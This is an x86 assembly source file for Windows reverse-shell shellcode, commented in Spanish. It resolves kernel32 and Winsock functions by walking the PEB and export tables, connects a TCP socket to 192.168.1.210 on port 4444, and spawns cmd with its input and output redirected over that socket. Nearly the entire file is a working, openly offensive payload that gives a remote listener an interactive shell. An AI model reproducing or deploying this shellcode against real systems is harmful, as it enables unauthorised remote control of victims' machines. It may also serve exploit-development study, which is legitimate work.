;WIN32 Shellcode

format PE console
use32
entry start

start:
; stack procedure
                push ebp
                mov ebp, esp

                ; asignar espacio en el stack para variables
                sub esp, 0x28

                ; coger el kernel32.dll base address
                xor ecx, ecx
                mov ebx, [fs:ecx + 0x30] ; PEB address
                mov ebx, DWORD [ebx + 0x0c]; ebx = _PEB_LDR_DATA address
                mov ebx, DWORD [ebx + 0x14]; ebx = LIST_ENTRY InMemoryOrderModuleList, primer entry
                mov ebx, DWORD [ebx]; ebx = Segundo entry ntdll.dll
                mov ebx, DWORD [ebx]; ebx = Tercer entry kernel32.dll
                mov ebx, DWORD [ebx + 0x10]; ebx = base address kernel32.dll

                mov DWORD [ebp - 0x4], ebx; ebp - 0x4 = guardamos kernel32.dll base address en el stack

                ; coger el address de GetProcAddress

                ; coger address de Export Table
                mov eax, DWORD [ebx + 0x3C]; eax = coger e_lfanew dl DOS_HEADER
                add eax, ebx; eax = PE_HEADER
                mov eax, DWORD [eax + 0x78]; eax = RVA Export Table
                add eax, ebx; eax = address Export Table

                ; coger address de Address Table
                mov edx, DWORD [eax + 0x1c]; edx = RVA Address Table
                add edx, ebx; edx = address Address Table
                mov DWORD [ebp - 0x8], edx; edx = Address Table

                ; coger address Name Pointer Table
                mov edi, DWORD [eax + 0x20]; eax = RVA Name Pointer Table
                add edi, ebx; edi = address Name Pointer Table
                mov DWORD [ebp - 0xC], edi; ebp - 0xC = Name Pointer Table

                ; coger address Ordinal Table
                mov esi, DWORD [eax + 0x24]; esi = RVA Ordinal Table
                add esi, ebx; esi = address Ordinal Table
                mov DWORD [ebp - 0x10], esi; ebp - 0x8 = Ordinal Table

                ; subiendo al stack string GetProcAddress / 0
                xor esi, esi
                push esi; / 0
                push 0x73736572; sser
                push 0x64644163; ddAc
                push 0x6f725074; orPt
                mov si, 0x6547
                push si; eG
                mov DWORD [ebp - 0x14], esp; ebp - 0x14 = address string GetProcAddress / 0

                xor eax, eax; eax = Posici�n en Name Pointer Table

                looper:
                mov edi, DWORD [ebp - 0xC]; edi = Name Pointer Table
                mov esi, DWORD [ebp - 0x14]; esi = string GetProcAddress / 0

                xor ecx, ecx; ecx = tama�o de string GetProcAddress

                cld
                mov edi, DWORD [edi + eax * 4]; edi = entry posici�n eax del Name Pointer Table
                add edi, ebx; edi = puntero al string del entry posici�n eax del Name Pointer Table

                add cx, 15; tama�o de string GetProcAddress
                repe cmpsb; comparar mientraa sea igual el byte de edi y esi

                jz founded; si el ZF = 0, saltar a founded porque se ha encontrado la funcion

                inc eax; incrementar eax si no se ha encontrado
                jmp looper; volver a saltar a la funcion para comprobar el siguiente entry

                founded:
                ; coger address de GetProcAddress
                mov edx, DWORD [ebp - 0x10]; edx = Ordinal Table
                mov ecx, DWORD [ebp - 0x8]; ecx = Address Table

                xor esi, esi

                mov si, WORD [edx + eax * 2]; eax = Ordinal
                mov edx, DWORD [ecx + esi * 4]; ecx = RVA de GetProcAddress
                add edx, ebx; edx = address de GetProcAddress

                mov DWORD [ebp - 0x18], edx; ebp - 0x18 = address de GetProcAddress

                ; coger address de LoadLibraryA
                xor ecx, ecx
                push ecx
                push 0x41797261; Ayra
                push 0x7262694C; rbiL
                push 0x64616F4C; daoL
                push esp; address a string LoadLibraryA
                push ebx; subimos al stack el address de kernel32.dll

                call edx; llamamos a GetProcAddress(kernel32.dll, LoadLibraryA)

                ; cargar libreria ws2_32.dll
                xor ecx, ecx
                push ecx
                mov cx, 0x6c6c; ll
                push cx
                push 0x642E3233; d.23
                push 0x5F327377; _2sw
                push esp; ws2_32.dll

                call eax; LoadLibrary(ws2_32.dll)
                mov DWORD [ebp - 0x1C], eax; ebp - 0x1C = ws2_32.dll

                ; coger address de WSAStartup
                xor ecx, ecx
                push ecx
                mov cx, 0x7075; pu
                push cx
                push 0x74726174; trat
                push 0x53415357; SASW
                push esp; "WSAStartup
                push eax; ws2_32.dll address

                mov edx, DWORD [ebp - 0x18]; edx = GetProcAddress

                call edx; GetProcAddress(ws2_32.dll, WSAStartup)

                ; llamar a WSAStartup
                xor ecx, ecx
                mov cx, 0x0190; CX = sizeof(struct WSAData)
                sub esp, ecx; alocar espacio en stack para estructura WSAData
                push esp
                mov cx, 0x0202;
                push ecx

                call eax; WSAStartup(0x0190, esp)

                ; coger address de WSASocketA
                xor ecx, ecx
                push ecx
                mov cx, 0x4174; At
                push cx
                push 0x656b636f; ekco
                push 0x53415357; SASW
                push esp; WSASocketA
                mov ecx, DWORD [ebp - 0x1C]; ecx = ws2_32.dll
                push ecx
                mov ecx, DWORD [ebp - 0x18]; ecx = GetProcAddress

                call ecx; GetProcAddress(ws2_32.dll, WSASocketA)

                ; llamar a WSASocket
                xor ecx, ecx
                push ecx; valor null para dwFlags
                push ecx; valor null para socket group
                push ecx; valor null para lpProtocolInfo
                mov cl, 0x6; IPROTO_TCP = 0x6
                push ecx
                mov cl, 0x1; SOCK_STREAM(TCP) = 0x1
                push ecx
                inc ecx; AF_INET(IPv4) = 0x2
                push ecx

                call eax; WSASocket()
                mov DWORD [ebp-0x20], eax; ebp - 0x20 = socket

                ; coger address de connect
                xor ecx, ecx
                push ecx
                push 0x61746365; atce
                sub WORD [esp + 0x3], 0x61; tce (elimina el 0x61)
                push 0x6e6e6f63; nnoc
                push esp; connect
                mov ecx, DWORD [ebp - 0x1C]; ecx = ws32_2.dll
                push ecx
                mov ecx, DWORD [ebp - 0x18]; ecx = GetProcAddress

                call ecx
        
                ; llamar a connect
                push 0xd201a8c0; sin_addr = 192.168.1.210
                xor ecx, ecx
                mov cx, 0x5c11; port = 4444
                push cx
                xor ecx, ecx
                add cl, 0x2; protocolo TCP
                push cx
                mov edx, esp; edx = puntero a sockaddr struct
                xor ecx, ecx
                ;add cl, 0x10; tama�o de sockaddr struct
                push 0x10
                push edx
                mov ecx, DWORD [ebp - 0x20]; socket
                push ecx

                call eax; connect()

                ;coger address de CreateProcessA
                xor ecx, ecx
                push ecx
                mov cx, 0x4173; As
                push cx
                push 0x7365636f; seco
                push 0x72506574; rPet
                push 0x61657243; aerC
                push esp; CreateProcessA
                mov ecx, DWORD [ebp - 0x4]; ecx = kernel32.dll
                push ecx
                mov ecx, DWORD [ebp - 0x18]; ecx = GetProcAddress

                call ecx
                mov DWORD [ebp - 0x24], eax; ebp - 0x24 = address CreateProcessA

                ;crear estructura ProcessInfo
                push 0x61646d63; admc
                sub WORD [esp + 0x3], 0x61; eliminamos el 0x61, queda dmc
                mov ecx, esp; ecx = string cmd
                xor edx, edx
                sub esp, 16
                mov ebx, esp; ebx = puntero a ProcessInfo

                ;estructura STARTUPINFOA
                mov edi, DWORD [ebp - 0x20]; edi = socket
                push edi; hStdError = socket
                push edi; hStdOutput = socket
                push edi; hStdInput = socket
                push edx; lpReserved2 = NULL
                push edx; cbReserved2 = NULL
                xor eax, eax
                inc eax
                rol eax, 8; eax = 0x00000100
                push eax; dwFlags = eax
                push edx; dwFillAttribute = NULL
                push edx; dwYCountChars = NULL
                push edx; dwXCountChars = NULL
                push edx; dwYSize = NULL
                push edx; dwXSize = NULL
                push edx; dwY = NULL
                push edx; dwX = NULL
                push edx; pTitle = NULL
                push edx; pDesktop = NULL
                push edx; pReserved = NULL
                xor eax, eax
                add al, 0x44; cb = 0x44 tama�o de la estructura
                push eax

                ;llamada a CreateProcessA
                mov eax, esp; esp = apunta a StartupInfo hecha en el stack
                push ebx; ebx = estructura ProcessInfo
                push eax; eax = estructura StartupInfo
                push edx; CurrentDirectory = NULL
                push edx; pEnviroment = NULL
                push edx; CreationFlags = NULL
                xor eax, eax
                inc eax
                push eax; InheritHandles = true -> 1
                push edx; pThreadAttributes = NULL
                push edx; pProcessAttributes = NULL
                push ecx; ecx = puntero a string cmd
                push edx; ApplicationName = NULL
                mov ecx, DWORD [ebp - 0x24]; ecx = CreateProcessA

                call ecx
                
                mov esp, ebp
                pop ebp

                ret


